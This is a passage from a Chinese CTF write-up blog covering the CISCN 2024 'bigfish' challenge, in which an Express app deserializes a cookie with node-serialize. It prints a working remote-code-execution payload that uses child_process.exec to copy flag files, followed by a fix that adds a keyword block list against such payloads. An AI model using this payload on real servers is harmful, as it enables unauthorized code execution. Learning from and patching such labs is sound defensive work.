class="string">&#x27;public/login.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">profile</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> str = <span class="keyword">new</span> <span class="title class_">Buffer</span>(req.<span class="property">cookies</span>.<span class="property">profile</span>, <span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">var</span> obj = serialize.<span class="title function_">unserialize</span>(str);</span><br><span class="line">		<span class="keyword">if</span> (obj.<span class="property">username</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">escape</span>(obj.<span class="property">username</span>) === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">				res.<span class="title function_">send</span>(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public/data&#x27;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//QQ</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/qq&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">username</span> !== <span class="string">&quot;admin&quot;</span> || req.<span class="property">cookies</span>.<span class="property">is_admin</span> !== <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">		res.<span class="title function_">redirect</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; req.<span class="property">cookies</span>.<span class="property">is_admin</span> === <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">		res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, data_path));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们注意到<code>/login</code>路由</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">profile</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> str = <span class="keyword">new</span> <span class="title class_">Buffer</span>(req.<span class="property">cookies</span>.<span class="property">profile</span>, <span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">var</span> obj = serialize.<span class="title function_">unserialize</span>(str);</span><br><span class="line">		<span class="keyword">if</span> (obj.<span class="property">username</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">escape</span>(obj.<span class="property">username</span>) === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">				res.<span class="title function_">send</span>(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public/data&#x27;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>接收cookie中的profile参数，将其base64编码后进行反序列化</p>
+<p>这里的考点就是nodejs中的serialize模块反序列化漏洞 <a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2023/11/18/serialize%E6%A8%A1%E5%9D%97%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">参考文章</a></p>
+<p>我们先安装此模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install node-serialize</span><br></pre></td></tr></table></figure>
+
+<p>然后序列化（无回显直接写文件外带）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var y = &#123;</span><br><span class="line">	function()&#123;</span><br><span class="line">		require(&#x27;child_process&#x27;).exec(&#x27;cat /f* &gt; /tmp/1.txt&#x27;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">var s = require(&#x27;node-serialize&#x27;);</span><br><span class="line">console.log(&quot;Serialized:\n&quot; + s.serialize(y));</span><br></pre></td></tr></table></figure>
+
+<p>得到payload</p>
+<p><img src="/article/2024CISCN-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240706112821088.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;function&quot;:&quot;_$$ND_FUNC$$_function()&#123;\r\n\t\trequire(&#x27;child_process&#x27;).exec(&#x27;cat /f* &gt; /tmp/1.txt&#x27;, function(error, stdout, stderr)&#123; console.log(stdout) &#125;);\r\n\t&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="FIX-3"><a href="#FIX-3" class="headerlink" title="FIX"></a>FIX</h3><p>将几个关键字过滤一下就行</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(req.<span class="property">cookies</span>.<span class="property">profile</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> str = <span class="keyword">new</span> <span class="title class_">Buffer</span>(req.<span class="property">cookies</span>.<span class="property">profile</span>, <span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">if</span>(str.<span class="title function_">match</span>(<span class="regexp">/(funcion|require|exec|child_process)/</span>))&#123;</span><br><span class="line">			res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public/data&#x27;</span>));</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> obj = serialize.<span class="title function_">unserialize</span>(str);</span><br><span class="line">			<span class="keyword">if</span> (obj.<span class="property">username</span>) &#123;</span><br><span class="line">            	<span class="keyword">if</span> (<span class="built_in">escape</span>(obj.<span class="property">username</span>) === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">					res.<span class="title function_">send</span>(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public/data&#x27;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>不过听说还有xss的洞要修</p>
+<p>用的是22年黑盾杯的方法：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/F9v9-8s2_mJhlEWRICzVvg">https://mp.weixin.qq.com/s/F9v9-8s2_mJhlEWRICzVvg</a></p>
+<p>复现xss参考：<a target="_blank" rel="noopener" href="https://blog.mo60.cn/index.php/archives/487.html">https://blog.mo60.cn/index.php/archives/487.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag"># 原型链污染</a>
+              <a href="/tags/%E7%BA%BF%E4%B8%8B%E8%B5%9B/" rel="tag"># 线下赛</a>
+              <a href="/tags/CISCN/" rel="tag"># CISCN</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/article/SolarLab-HackTheBox.html" rel="prev" title="SolarLab">
+      <i class="fa fa-chevron-left"></i> SolarLab
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/article/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E4%B8%8A%E7%BD%91%E6%B5%81%E9%87%8F.html" rel="next" title="闽盾杯2024-出题人的上网流量">
+      闽盾杯2024-出题人的上网流量 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CISCN2024-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA"><span class="nav-number">1.</span> <span class="nav-text">CISCN2024 华东南赛区</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#submit"><span class="nav-number">1.2.</span> <span class="nav-text">submit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BREAK"><span class="nav-number">1.2.1.</span> <span class="nav-text">BREAK</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FIX"><span class="nav-number">1.2.2.</span> <span class="nav-text">FIX</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B2%97%E5%BF%83%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%91%98"><span class="nav-number">1.3.</span> <span class="nav-text">粗心的程序员</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BREAK-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">BREAK</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FIX-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">FIX</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Polluted"><span class="nav-number">1.4.</span> <span class="nav-text">Polluted</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BREAK-2"><span class="nav-number">1.4.1.</span> <span class="nav-text">BREAK</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FIX-2"><span class="nav-number">1.4.2.</span> <span class="nav-text">FIX</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bigfish"><span class="nav-number">1.5.</span> <span class="nav-text">bigfish</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BREAK-3"><span class="nav-number">1.5.1.</span> <span class="nav-text">BREAK</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FIX-3"><span class="nav-number">1.5.2.</span> <span class="nav-text">FIX</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rev1ve"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">rev1ve</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">73</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2024-03 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rev1ve</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
+      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
+      placeholder: "快来评论叭",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
